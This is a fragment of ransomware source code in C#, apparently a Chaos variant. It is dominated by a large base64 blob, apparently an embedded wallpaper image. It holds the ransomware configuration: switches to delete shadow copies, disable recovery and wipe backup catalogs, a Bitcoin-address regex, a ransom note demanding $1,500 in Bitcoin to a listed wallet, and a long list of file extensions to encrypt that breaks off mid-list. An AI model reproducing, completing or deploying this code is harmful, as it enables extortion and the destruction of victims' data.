Ud9Ci12twQqmQMM7pCPhzI/RsPl/ujkdbbYqateclrDa4qSnm5p463hvWS01QOt8LeCATWrL1IhnkdsaFXTDqx5c3ae9U8RD6l3PP4bk2NuVjQ1o4JrPFF3Sz7dqMjtdiDRYd+vosmo2dA1JbV0ruarItWuG9et3p6lvN1bNHMO/yTHbCmvbZzQR4rDqnUwZHcWaIt/Z6tw8HKtk7QjefmBsViTKM00sDpRuPBVtNAyL1OY5RwVWdPUpv0VVEzJFh8jW+SrXzCX1D2nzFYq/4I2eblVv+tqmjwa1UsVQKOhz11adNvVao8OHPT2lqjtdub5KyY3Zqi73BkN9yDRb7gC+JmxW5WVtpYzzVUzsyD/dSQzeqYm3mZxsk+FycN+iG8KM70w/EhxHQHEKjw+PPUztZwG8/ksS9IDkpr0VBvkPaeqLCYclNH1j2pHdpyO5E7/cl3WdoEGiw+42yat0Kcw2I5YK2Lm54w4f6LE8J/ZH+tUw+ydtCpHnJPmp5PlkCilF45WPH4XIop3FMj7czW+brKgh/rGc8GarFcQ6tDS8xGftZlEyXn615qp+L9gWlt3ui82AugzV+p6N/uFkos4JzdWahWPLBUi00TH/xBUDjdgki/gerfV4hVMH8Sl/9Vqkx31tbUv8A7yw9vbEkn8T1R031VPG08be7JTnav0CbGLNHTv3i3uo5do14p7NWdYIt0It3AvNmi6e7V5yhRxbBrx91fTf3a3vWP7QBTD2TZSN8URtB909/ZaSpnbbNUTe2S5MYOqAPe38+6W8+5MPwhM8U35ivxlfjQ+dM+YqLhdRt2NHcs3n3LL595KPdM3n3DL590e6MiN2R242uqymiEhqQ5uYA+z2KquCaoEf2aqHEcw9jRvzC6rjUmESxEtbdxybFVB/tpI3N/C3u+bz99l8+7CeB8R+JtkZaJod9ZH7N/mE2CF8r+y0XKcIOek+smOd3+3ec3n7zL5949Txwx/Z1bcw/jC5+opaEfaOzv/hHe83n7rL595LaJtUwdemeJPy3oV2LVdY3WNjWxR/6nvmbz9xl8+9NlifG8Xa4WKiw2l5iEki97u2nvubz6WXz++s2m/oZfP78zefJl8/v7iP/AGB//8QAKRABAQEAAQQCAgICAgMBAAAAAQARIRAxQVFhcSCBMJGhsUDwwdHh8f/aAAgBAQABPxCPF+jdn+XIImQWWWQWWWWWWWWWWWWWdGWWWWSWdCWfy5tvYd/wHtfozx/GHQEFkFllllllllllllllljZZZZZZJZZJJMT+M5Zew7+X8h730ff8IQQWQQQQWWQWWWfhlllllllllnQllkklkkkkkn8AbL2Hfy/wD2v0bPyCCCyCCCCCyyzpllnXOmWWWdMsnJF3Qh3rQW9nv1RNPpIJsclllklkkkkkn5BsvYfZ9fxD2v0b4/AIIIIgQQWWWWWWdM6ZZZ+GXzfUoyTw6Jfj1nvrd4mPbsY+BOR03x+YhJ1ySSSSSSSSTrmy9h3/AJB7Hv793xEGwQQQWQWQWQWWWQWdM65ZZz3jlPqP+3Auja78Ht93xr9IcDplllllknTJJJJJJJJJOi9h39/zHj9DZkEEEEEFnQOmdMs6BZBZZJ32kmOT2/5ytXPzqn9QrhEEBZ0yyyyzpklklkkkkkkkkkx8Dv7vH8pBeB7+GBIIIILIILILOuQWdMkOs4DDN308DHn3/LWdcs6ZZZZZJZZZJJJ0SSSSzm8B3kk/kIIOjwPfwwQQQWQQQdMs6Z15LT3yy7+z7bGv/rkcHssfHHqX93Zf84bvn9x5Kz4cJ4kB7Bs65JJZ0SSSSSSSy8B3kySST+LIIIILNh7Hv4YPEEHQIIIIOuXek+9t/CHiwExXBwfc77PtsPB7fsIp0iy4Ypu5dwbTsY/Fncn4b4V7Lz4+nplkknRJLJJkuHB392ZJJJJ/EEEEEEFyvA9/DZnQI65ZdoLH4EMLV3dGd/uE5A67weAfB0l5yp898lv4PnYdBFkUIMQ6juZz7LP6ojn6J6Z0Zks6Zs8cHeTJJJJJJP4CCCCCCCyyOeH9MGdAs6BE4t8BBYCRZgeVmRA44QfElJD5sFOsIY3jMD8AyFIZ0CkJsbg2PO+Nu3ceyzolkyTxwd/LZxJJJJJJJP5EEEEEEEEEQDD4Yc2cMXyn4l9uvJQa4Hu4J9jiPBvdr6PbOLtXbMHmDiEPwDO/9ONzlcO96yyyyyyyEXJEIO2xeB7Ey7bDk6JZPfCzjOiTJJJJJDmfxCEEEQRBBBZZHpvK6C88tK3HiHqEBkNC0Tw75nQ/D9eFynagNLYDAPRZBBZZZZBcQXe2c65ZZZZ0MdEg23ZVvm+j1GE0bNn0d/dmdEmSZJJJJJPwIQQQQRHQII6Zs8A8rtFKT9r36MkoHhB8dwgGV2Asggsssgssssss6Z+Q9E6g1xbVd4ej0sySySZkkkkkmE9QggiIIggiIOi58vguDeU+MeL9IkCBzjTHwrb3W3GWXRLILLOmWdGY559JwWDdq/N6p0YxaxN2PHt7veH3Iymj0Zkkk6MkkkknQhBERBEQdCC4I+QRrdR9r0RHUuXtntuDXD4Z7GBdBeU/aobV4LoILI6tFvGC4PpY3PrmIP33WoSAAMALOr3/ACejNuWvF4Dv5bxZN7ff4budHokySSTM9ZBEEEQQQdAiIeXYlQCWwB3WeOidq8STgDADsWQ9j38NhWM/CTtreVoKyF9A+ToBd3YrRv09jv7tRJySSSTJtttt6m29GZe073DkMNguUYZMzMzMknMkLIQQRBERHQiDXCw4JHCMPagrQw/Cdh7+HpVyMskPuUP4i+gfIy4H36pnb3vQo/8A+ZwPQfgyylmNan30B9xSk5WXsO/lktx6S6Q5gNsR2AD+5vMkzMzJMyc9BERER0COn9rMfNs/t7wuXrG8sPQzPSXB7+GCtsO5DEK5TYRd8hKTfwZSsehn5sp7wLyziP8AOyd4r0Q9ifU+NPcIPPpuwO94ibM2DGunxchdNvEknRmZJ6EREQQR0OmjCOTf4DllVjbWWxkgH3STY/14k8vlDAPW9ZdE5XiD/D7y+HxbuL96/TGSCJokQYei9DAiPM1CP7YP+1FLnV5fW1OWIYmrX8A2blrv2YC9UG0jUv4M3zY3g4btMzMkzM9CCIiIjodCeVfh7y24crAlxksQ3gXC7oauGxBK+zLfsz4OYfnGmL7cU79e+33D0zKl/B8GJ6A29LCPuLVOZFxRHDcw9h/B0UgC+BsJ2eIdziYD12MjP4Fy3nK6vLsWGPLeGIQet7MIOYdJt6G2528NkknRntMzMxERHfoRHQahZ/FI9vghbUVmuWcev5TN89TLHzHz0PB5+CLpPZvb0u6tg9qE9+RyH+/8uUI7IO/XNyHjo8LdlDgO69E65+9f9jy3AqF24iZz9DYKBh4uzD/QFnjxjTONwd0mihi8k69r02A+8LnHsnZGRV8PnCQD0GWW3oshDuO2deSZ6M9GTqI7RER0EdB3ZRuAcCkoXYDgIgt7vYpOTyTZRluw+CN0p9scfMl8X3ZV+J45/RtNDbwUeThgAAXD4EIIARORvHGDdnQcSk60ddu/55ZoT7IcAT6LO6YAeIPqzo/b6ku8TPEFyYN4zTqrlleM7ZMW/hkxejeuv7ZmZmZnvPQgiIiIjoiQMZ79Erk3K+K8S3XCo3/ohjqQA/2gzSsKuhPu8rHuJ8z5mw+CU8EnwXfy2zwI0DWj7pS9I7dBKw0hpEvERHiE8QfUR7H2NxnpPhifF3UIzJG8xP3HaTTlE2G592OTJ0ejMz0IiIjodXyAheKFc4/YAwJbkJnD3Qg7p4mhOxoBkjQDUeA7sk3R4wj8cZ9QPUew9/DZnHRhtrfWKUj4Hfy3CyySH4AbficuHDn5toMO65Ppi+0O/ClqsCjwww3wOIdNmejMzM9+giIjoRbyGDlfRNPruvVHXaaINS8lzhctZE/BGRlvon9Z5u1+Yv2K0ebLOome6Fi+v11ED9gJTBnpnCcxj42Syyy5O2WZPRn8C7vSnm0VWUSAx7sBl972Rx8jD32HugezfKcZmejMydBEdDvHXj2qP2zqnnl3UvPgSAu/ILMoDHchCwn+qF3P6jIwvqe4g9+Lx5Pdp7LDx7Du3r7MnZMHk5nMI4pXf9bFBj8k9i+zXNfNTj087ISV4Yd6KH+VWdM6PR6FZRHLbmme5SGeN7x5O5boeGGCf3Y5w/FxSPVAvbf0sxx5+J6Mz3mZiIjodCZHfdMIoDWxItMPm7D0ESK1FzmxDpl0ge1b+iXnbQz+Ie/LK+j1DZi+i0O/vwWCx/oPlnFc/lo+ukhfDoeb/vb/AL2/7Xp/Jx3v1ZrDJ3lB9pKlLvNhfbq4MA47rZXm8DGvC3OWf/1z/wDrsN28kk1zMGqxsSeBhx4LmnZtkTlbcRYrxHiw8QHKHs5I3zKAuPhle87vySa6ezPR7zMx1ERCQbV8JhD6yemzhwfqZgsIsczmRbyJKtDysDUfcULv3CzS8dXYdKHwQZc43WbjsPnyyeAQThvzy9iyUhguq7nVcpkprXL/ALmRN/2uKM03J/y9OdUXoOgHpLe/dZ37kSYuv9hemRO89j1dzeS95BqazvO1Q98QQ/oCAnhdrQZzzuCQg425fqykxszY9t0uGuQ4Y25FTUXh4XeICe422PYeyV7xy6Hv0e8zMRER4m437Nv8b44DyOZXa6g8Qj3WBPZibbd+7a3wLIMhjTPnmAHUF78f6jkOF8oHAxcNxmls8mHtD/xS2FptsugTPr+k83o9X+Glps8iM74nZtUgmrkRjIoRySxXmauEezeoHqPBy3u9L4cP2LPYG4cBaeweL7uGue+7f2W3vTE9GJM76xeBemxO1JoVfd2x2JheM9Hv0ZmYiIMnMx7nh7lvnMHKrGtrjl23RgWSGs7sTjzHJ7YeC4Ew0WwQd+WLfsnHgp8IPl+ZCZV3Pokq0QejF7lpgn2huxviScBD6iLBersj3EnxylI0nwWTj90M4Fvm0Q9QM2RUkaXkm5/TDQS+L0loJYt0pjpD7LnQ78EmCPqYDRZS5BjL+yLsbBSCkrxJ+N6Ii8CzLPiwQ7i7ZPR7zMxEd4aCBJ7f+kkSDNT3vcn02uezbC2yBPHawT4bYfF9IDLTJcQNB8YbE1o6QSmnRsJYjxpauHD5zW7LBxOAG8G36t/Hp0xXTO8IIA73j0ofb+iC7AncPR/uO1nntBwHGHNo4puScCvDazk/lmaGOkoAbjslYB87dhBwyJVe7YrMQhdxbNJRDjYdeWFgi6lyOjhMbCfsIM6WZ7zMxHTh9Ay8lN6hvKdH3s6LacR2wQeC2v18NWsH6Uv7LNe/7KgJmQ2OD5iBoDhDvFJHhFvIZ8mcW1uo8rzbkfjBT8YITtDWRuzvPpvw7W7Df6s2hKqR95jJJJCF22SuJPGtuP1C1o9n0zbSBhfdRJfDaXghTC7ojdCwJvMz3mZiOgac9kmROORZzd0+Z8SI28jKgcvb6ozETk3prFj/AK0gAhxAgkPclP7CvJpu9/qTJYbXPT9Zpv4PO4dz8wEMzGfnHJkqiPsKKsYZ6mE7/wCrK3/5Kkmeh5CDFzB5WEuQSWb/ABkc9nESTtvH6ZHChJ2MJpy3HtGhB2Anoz0Z6ER0DO4f7k6BhbLUJYz7iy6nsQgDgMLYYMHuZc5crGyjz/5EDa4iIFLJ2mR/LB/QlzybOlFTZZPHB38sYsssssstFMF+hy2HXacAgSGvR3mZf/7hdGFZZiE0esspl4F8ur5J4/fbxYuB9cfZjlBBF8+NmGTMzMzPQhiIj1HxCSZH2Tn/AIJTiMvA9ESPj+EPDh4RhNzU5Ny14jUEID2OxvmBGPs3tZ7ybzX/AIZ5Lz9dc22hpAF8Sd5c57yXODv5YMP4EzlotqfOAEn9bO8YbbAFGrNnUu4TvHqNpwXpfdH46Js6eVm9Db05g2weLjnoQQdBcz6b0ZnozM9DoIiIiOnyQ6w9rNsSwzQIdx7M7ODByeTGQHP8CssOeJ475ODnefb5lIFwxo41du+8w11pdKbn6S2zkRUgJt7JnvgrsqjtG/S7sv2u6fum/wAbtK/2/c8c6jMN4SIfzNXB4JNNdWJgP+5jWflg24t08GTHg4j+T7+H7XNV4no/gLafQzMzLP4giIiI6acyXrpaaRjlARZIbP2Xow73w29Nl5X0Xjnaf2LOjVnjseRi6RJe5nAI6/8Au3/7Uq8/2ZH5/u+l9DqC8uDOHszn9b0RycE4/wCAk5lyAZqHeE7rhsA4fAlKkdyeHoTZzAIUxJvsnE/vP4YfksXoSZmZlmZ6EREREQx0wB8xkzUhAXeuOod67Aa+K6o/6cfhpO13YIwNaEIY6OOdiMHkCBwfIdAUBGntdL6TGP4MQWdW4zu8HnmeRcI4kuAWhBip854hMEehOHLvZuhnZ1IsaJ2y4OC4fSRoA8j0CXi3FIxvx+AEXL+3Qz0ZmZnoohiIiHoRG83BIWDj2YUUaMqOci87YOoMNXAEQC/EuzoDQNOe8bUqV6l+rfq16h+o+M2fkzm954TeGjI/4YAA4ADicHC6RkuFU97zt3oqxwnIy2sFw+DKwQcRmJmz5fUHYOAdgtOHaX8DqWWeXllmZZmZmXooYYiIYehEWOJwxmM672kY6Dt3r58GeIECrsE8QwHPqDLm9ifc9x07bNzhvDbG6dF2PlJ+M/CfhY9X1vpYWEp2tJEjn5v0z0Ewdk31swobkRIsDA3cLAiNt8xE5EldUHHwfUA4mAi/umdW9SfG6jMs9FmWZYeYhiGIjqMRMpUULdRHHsnZFHNgNiOfeHjmA5fAkhNXu2piGC7LCb6Exi5H5d94ZFmT6s2fUiyA1XwXyizeIwdWAeWDhnvDyrG8/P8AvTwsRuGIWC3/ANQjHDgH+2Mwfv7m7zbb1AdxgJlllmZZmWZZeYYYhiGIYhhh6cMcCweg00kxVAaB8MGB7sET+Q+XKIBEcRl7qHZsMJp91GjH5xJ3izxxTjGJDkSc0MGnYie0j3cv2nJVYfFlXdV4sOwigB9HwnCjuAMe0FtiBPggAxw+B2gDzNjKMAN2bT3/AC0RuYDAIC/vegxzfV9zxw97bYNbh3l26LMsvRlllll6EoYYYYYi2IYemXre9lIva8X2vq44e7z+Ftpz4jiOAj+ra+hZ2BB3JuAwCWuDsHA8x9IJPw+ojB3B5nDsEx+GdOPN7hXg6P8AMD4faRaBNgYufwPEMwBgWobyHKx8eceIF14W3hLR6FjHHjxfc6OMWcfH/M+vEsssstssssssuoyiIYYYYYYYbZAYmk2Tru+H3fUxi5pHn4/TECD9l+i4WAIyf9OUh3rtQFyNiQHlrPkLaNl9IwNmcghPk++fWrFnxY+8hHDk7UkPEZndh7JfYGv+Tb5CAecuHoWUW7h7w5MXucUL2OAwLsHKc5Z6G22y7OHi+7vgHuxEACWWWWWWWWWWWUtvQchhhhhhhhhthhhsBZu95087jjPQ3vlLn1Yz6bv94Lwj6ZwjdwaMymSnO+pHbXfDrAtbEDubHryFiEpxMocUdAhpMBgvISPbRkIPmBBN67vvy9hfDfhuRygXAcl5LD1ad3ox+AHbZtPNgAgZ2ZjGLLMYsssssstvUYYYYYYbYYbYb0P2w8SIR5EnNDfIki9Hm/nHX4gLsh2JBE2pXB3mRHaCx9q+xfrfpYd/7J/+/P1xULuOzrkMLzIb4B8Xc4t8/nEc2Tr6fdkBgTqN8PecdDGMYxizFl6b1GGHoDDDDDDDcODvDb1AHKWahlzoaeM3yvYyfwTs1xt/CgP7jbgboMeBYHy2Hd3+Aum6J9e1XRwK1l7u6/qjAGA4A/GX8fhVJsL6nwW22yx2nv4Zc6OzqMYxZj1b1GGGGGGGIO3Dg7+WHi23o3owKbfrKgiPVyPfhUtvTddLhz1gn/6l/v8A1RfTViJ7w2/2/wAYCtcLLry5Pm2XqLLA4Pfwy5LbPKYtssvTbfxGGGIMQdntHfyxD8Hz1mH9r0W4hG7Ujw/xjd29+h6vnD9CzJA5+8/hHnUd19GXGYsxZjq23rttsvQQhCE8R38vr8+Wvyn5WMzHzCZJrL/F5LtGH4bjwfZZ933vvY92fcn3I9yfcn3cB9MWTsPlsxV9diWI09EfKOifwSzPG/R9y48yzGLb023pvVZbhEIacJ7Z9n1cPw7Gsa9B8kst88nuV7tO95EN8D6bwRkeP6r/AK5bd3eQ8fu/szHHfqy4HPq+S389H5b5bWIUhT8eLHYfo+5XcZZbY/HbbbbbbhGu1xYc+b6/ANa1rWv4AFObKaeSWXL92vbHu6Jfc/uX3PP76fzXzfgIUp0DqGY4MSNsP47+Gy23d4uDD9/XUJsx6CyyzMmz+IWZgWqcvBat4IDC5sGQqKBNP7sKtuLGLybWa7Ft8D2QbcKSWaCW7c5sn4QEHptttstucePF9yZ3iPy3ott37Shw5/1lttht/BsskmNa9Q/D0PhhtEadxEQ9cFwULheP9SHs/RfXo+sfCKUx+SKCEIIjq9GCOGP0fdmcMfmy3dl7Tv7vr8Rt65Z+Q2saxj8Jjdm4cfruy9l/U8857GF9b6X0vrfWKfGIUhCnQFOlnVOmQWR4PHv7sxbzZ+XdwlBh931+D+BH4ZZZ+Z+OlMt7P56ORNgwjk7Qn1I9WLHqxYsWYHqB6gwYHSTPzCzrkeDx4PuzPy7vEoMOfN9flnUh6D0OuWWWWWWdTVo5exMuXT3lo/iGPxDLOjPyW3oFn45D2P0fciOPDZ179p4YZ7Pqf4c6jD/Dln4ZZZZZ1Msss/B67b0CP4R7nHg+56HLhPHDnzfX/AGHpv8Awc/B/HbLLP5NxjExx73oc+/r8X+UYYemw/8AD38s+P4M/IGd99/x5Z/FvQ6j+S/g9Ft6v4Z/wMv/xAAzEQACAgEDAwIFAgUEAwAAAAABAgADEQQQEgUhMRNRICIyQXEGMCMzYaHRFFKBkUBQ4f/aAAgBAgEBPwAHEI/ZxtiYmN8TG2Jj9n6fzuDCP2cTExMTExMTESi1/pUmW6W2lQ1gxsRCPi+n8/CDiMMb42xMTExviKjMcKINC472kL+ZjSJ7t/YT/Wcf5aAf3MfV3v5cw5PmY2xMfB9P5+NTCuIBBMQCY2xMSql7ThBmelRV/NPI+w/zG1b441/KP6Q95iYmJjbExsRMT6fz+ypxCuINsTGyqWOAINPXT31B7+w8w3NcClfYDvgTkvtK+DHuIKKTDo6z4MbQN5Ux6HTyJiETGxhEI4w/GNhFOIV2xAufEq0zPH1S1Dhp/wDuEk9zKbGqcOv2mqqVXDp9LdxBkRbmETUxLwYLAfMs01dkt07VzExMT6YRD8Y2AgimVWIV9K0fL9j9xBobOWPt7xa66V5Hx7/4mp1TW/KOy+24iWK1BrfyO42zsGIiXkRLswOGGDL9MPqWEQjjsYfiEG4gE0unNhyfphsSms8vomv5kh85Q+PhNTheZHb4lsKyu/MSzMuqHkeYQQe8Ihh3Owg2EEAmnoNr8ZhQOI7KJq9Q1j9/H2Eov9LKsMofIl+m4EFTlT4MWuVaQ2d/A95zqq7VLk+5lr2WnLnMImZmZ3BlVuOxnLIlyZHIQww7GHYQbCCATT0mpAo8maiwfQvgS76opmnf0xxbuph0yU/PYcr9v6y29rPPj2mYY0JihmOFEq6XqHGSMSzpWoQZAzGRlOGE+n8zJBzKbMiK3eWpxMIhhhh2EEGwmhq52ZPgS1+C5+5jmU9Nt1J5HsInSdOog6bWh5L3ji6tiL+6mXVGo+4PgzMMaaXpNlvzWdhKNLVQMIJzA8mBlMu09dw+cTV9Lsq+avuNkODA8Yc02O52EEEEE0FQWrJ+8usLtyml0QPz2Sy6uodzF19bZI8CL1Wo+RF1tDjGZbp6XqIG+g/06J6jnvLurIvZJb1O5/vDqHbyYL3T7yrqNqfeUdVrfs86nRQa/VrOyyppYuGxDsYdhBBBFGTiXfwqQnvNKiFyz/aazqap8tcsvexskzVN6KDTj8n8zkYHIi3OO08TMYwwCYC75nmVdGTU0Cylu81Gg1GmbFixDgy8eDDsYdhBBBNKnO5VjaO3UvlRgTqFSad+KmWnJmhQGzm3he8NTOS7mek3n7Sul7G4oJ6FFfax+/8ATvM6P3b+0C6T/c3/AEIaKG+mz/sSzR2oOXke47wdp+dwIiE+J+nX/jei33n+krtr4sJrf0/pXJKjE13RLUX+H3joyHiwxsYdhBBND0jVa0/wl7Tpv6Xp0xFlx5NNVWqVlvAE1rNY8dGB7iVYq0nL7sYcD5niVtaQDNTcEX0qfH3PvtXWhTJnGmW1qAMRidOQ1ZxDVVq1yvZ/7GWVLWMN5iJUcCV9MZ/tKejUp3fvBRWgwoiMNPr6nHuI9vE4EtsPKPg+Z1zpa2Um+vyIYYdhBOh9HS3F18pZQONfYCJZg951ZsaJyJogDbkw6eq1fnXMv6bXagVTjEu6ZaGBXvPQtqDuR3xgf8yythUARMGJ/JiUBhmXVsQAolukusA4rNP029fqlnTktIazzKtLTV9CwbNOpPwuQiK4YBo2I8uwKHz7GHH2hh2EoXnYqzTVhKwJUAJmdWsxo2E0j4vxKz2gHaHYqp8iejX7CeknjEFSDwIFA+Np1V83qJ0PqFWooFTHDrCBGWde6mlVRorOWMMMOwitg5E6Xrk1dIIPcRJxzP1BrFFY06eYLOFwaVNkbGH4MfHmOwmuflqTiV2sjBkODKf1BrFGCczW9Z1ToByxmMxJydjDsIJp9Tbp351Ngyn9UXKMOuZf+p9TYMVjjBa1y82OTL+xzNBf6lIM9UDsZzUwmA/D225AQvOZ21FopqLmKSxLGCVjJmpbL49odjDsIINhNK3lTL0yJ07U+jbwbwY2w8bO+DiepOc5xWydnf5sRm+aA7dW1XqN6KeBFEAlY4jkYzZOYdzuNxEYqQRGw6hhLUwcidM1frV8G8jZdtSGByILp609aVVtkMZa/BC0qfnYJ6mWJlU6jrvRX00+oxRAIgyZe3FeAhhh2Owg2EBgM01uDwMtrlNjae0OJXq1Vgjnz4MPiV3q3ZuxmVcEAxkZTgzJlFLWt2jsK1yfAmq1IsAVZSOKl5ShM1nUVqHp09zAxJy3eccRRFwi8jHYsSTCdsww7iDYQQGVWCwcT5licZSylfRt8HwfYyrW36RvSt7iGynVDKHvNMGrswTiW0c3DSw4sKiIEViB5mq1IxwWVoXOBL9RTWAufEv11lg4r2EAgEWJWAOR8S63mYTCYTsYfgB3Bggbh3iWi0YbzHriOli+ld/wfb/5LaLKW+aJqbF8NF6jcBxjawk5Kw65h3AlRusHLsq+8v1ny+lV49/uZnYCARUCjk0s1HLsPEMzMzMztnfO4MEB4zM5RNT2w8KhhlYlz1jie6+xhXSv7r/cQ6ej7Wf2M9DSjy/9p6mnr/lpk/1/xLrnuOXMxAIBFrJjOlf9THtZzkzMDYjDEz+3njOUzMzMV2U5ETU/7hAyN4M9L2npmemZ6ZgqM4AeTGurXx3j3uw3zsGhGP2uy/mZ3GwEAgWKCIC3vMtPmhVj941UNcKQiY+AHEYfsfT+fhG2YDA0SziQYNUWp5ADIPsJVcBUXYD2Hb7xr+RzDZC8LQmGGH4FaEfF9H5+PMzAZynKaR8v6Z8N2/xNUxr41ew7/kz1DPUnqTnOULTPxBsQruBPp/P7WdswMQciPY1jF3OSZmZ/cVsQjb6fz/5wM4r7w+f/AEH/xAAvEQACAgEDAgYBBAEFAQAAAAAAAQIRAwQSMRAhBRMgIkFRMhQwQnGhI1BhgZGx/9oACAEDAQE/AGhP1WNllllllllllllliYn6+erQn6GxsbLLLLLLLLLLHNLlkcqk6RYmJiZfo59LQmWNjY2Nllll9LG6PNXwXNmy+WKEV8CLLExMTE+nPrZuGxsbLLLLLHJI3SfBsXz0sssssssTExMTv9hsZZY2WWWWQx5Mv4I/SRhTnIWmxk8MEuyHFfQ4lFNFl9E+lidiYn6mxsbGWWNitukeXGKubIYU+8//AA3GSpxcWYsjaqXKGxpDgOJRSfI4tdxMTE+iYmJi9DGxsY2Mkndoi1ITf4xMeNQ7vkbLLGmpqSL9DiOIrQ4bu8eiYhMTExP0MbGxjH02uUu3JgkktvyNlllm9XXqocTgnDerXRCEJiF0Y2MYxjZx/ZjgoonHd3XJDJfZ8jkSy0VKX5MilHgvpRXocbI9mZ8f80LohCEWMbGMYy1yyEf5MjwOJkg33XJvc+yFBR6pEYmylbJajDH5I6jFL5NqatFCGhd0ZYbJUIQhCLGMYxjIrcxInnjiVcsetyD1bkqYo45xvE6aI+4aEiEDLqseJVHuzJnnkfuYoSfCHjmvghlnB9jDqoT7S7MoqxI1ELjYhCELoxjGMbIR2qjLnr2xMeny5fxRPQShSb7sfhslxIlo80O6RGeSM1uJoRmWWb2wXYx+G/ORkNPgx8I8yK4PMUuSeHBk5Rl8M+cbNO8sZbJoS6NWTjtk0IQhdGMYxmFbpX9GXdVRNN4ekt2UlkjBVEhkc5vKzzDzSeS0Slb6Qm0PKOZus3CmRyMcrJ614cjjNGLUYsquD6aqNTsQhC6MYxknSIZoYo0+TSuWSO5jk6NRJ1tXybkuyN6JTSVs8ycuEf6heQ3zXKFlT7ehCIniuB+XvHmnjnaZg8WzR5dktfHMkmiLsQhdGMZm1GPH+TM+vlLtA08nkml9mDDshfwTJ3PLX0f8RJNRIRt7pDHJ2e4i2xe7sxSlB9+CMnJ9j3Dy7eWS1b4iQzTb7st59FOEjKriYodrItrg0ud3tYhC6MZq9S4KomXcu8huzw5J6mCNXKsKSJZpwftZDUtSbZHPBpnaVIStm1ji9w930QiyFJ92TyYyGbZaRPNKXJfSJoO+KSMqqTiQsiY73qhCF0ZN0mzNJuRmbfTwi5apMz+7EZlT6Jlik1wxZZ/Z5kvseSX2OTfRD9EEaP24WeKaKcMjyRXZibIdzSYG3uYhC6MaNThcJGVMo8E0kozeaRzGjURpj6IarrZfRXVofVJkINGP24khxUltZk8K003dUZNFhxOooSoQhdGMnBSVMnoIMhoMcXbNM/ZSG6NVj9wsVq0PFISaHBji10pm1ji0RbSNjn3I4rVihFdMUHOSQ+7rrmlc2IQhdGMYxmCdSo5RljvjRHsq6Pnphwb1uR5A8J5LMuLbCx0YNO/KUjHhvEmTjXTBDZHc+SK6ZZbI30QhC6MYxjOHZhnuRNV3M0VGdr56TToTtHhjxOOyb7tj0SHoj9EazUYdk8cebo0uBZs0cbXJq8Kw6eTXwj9N5eKMfpGrpOkYcd+6RFbnbEumpyW9q6IQhFDGhjQxmDJskLuZ8No271a5INKSsz6KeL3QVxZWTBKM5Jow58WWCnF8lRZr9dh0cLfL4MOKeoyqEOWeE+Fz005ZMvPCNdWXLj06+Xb/AKRr88YI2b3vmKLkREjPkWOJy7EhIQkIoY0NDQ0Mo0+b+Mj8jPgafmY+So5FZ4frJYHsnweJuGo0rcY7v/qNL4g8GCWOu/waWO/SRyyfwZZZssIzmvauyZ4P4VJSWozf9I1Opx4IOc2R1dOWaX5S/wAL4Rkm8krZHH8yEqNpKairZkm5ytlCQkJCQl1aGhoaGhoowaj4kLuZtO09+Nf2iMVNXBkJ5cTtG9b97XdkPEpwgscUqQ9fJxUaVIyeKZeE7ZWbLLdkYsLfJHGkUUZJqCtmWTyMSFEURREhIS60NDQ0NFFG0xZ5Q7Pgx5IzXYyaaM3uXZ/aNuoj9SLy/OP/ACisz4h/k/T5Z/m6/ox6eGNVFCgjabRpIy6hLtEbcnbKNokUKIkJFFdWhxHE22bDYbDYJNcENRJdpEc8GJxZRtNpSRLJBcsnq1/EnknPk2iibTaOAkKIoleiihxNtmw2G0oooooto86a+T9Tk+z9Rk+x5JPl9aKKFESKHERXqorcbShoaKKKKKHG0eVU6tk4XNJMUKNoolFCQkJCRRQ0X6uReloooooozKo7l8GL3XMooorpQl6bGKXo/L0X6q6UNEYKKpFdKKK/ZaE+nP7NFfvX6mi3/sP/2Q==";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[15]
	{
		"----> Chaos is multi language ransomware. Translate your note to any language <----", "All of your files have been encrypted", "Your computer was infected with a ransomware virus. Your files have been encrypted and you won't ", "be able to decrypt them without our help.What can I do to get my files back?You can buy our special ", "decryption software, this software will allow you to recover all of your data and remove the", "ransomware from your computer.The price for the software is $1,500. Payment can be made in Bitcoin only.", "How do I pay, where do I get Bitcoin?", "Purchasing Bitcoin varies from country to country, you are best advised to do a quick google search", "yourself  to find out how to buy Bitcoin. ", "Many of our customers have reported these sites to be fast and reliable:",
		"Coinmama - hxxps://www.coinmama.com Bitpanda - hxxps://www.bitpanda.com", "", "Payment informationAmount: 0.1473766 BTC", "Bitcoin Address:  bc1qlnzcep4l4ac0ttdrq7awxev9ehu465f2vpt9x0", ""
	};

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
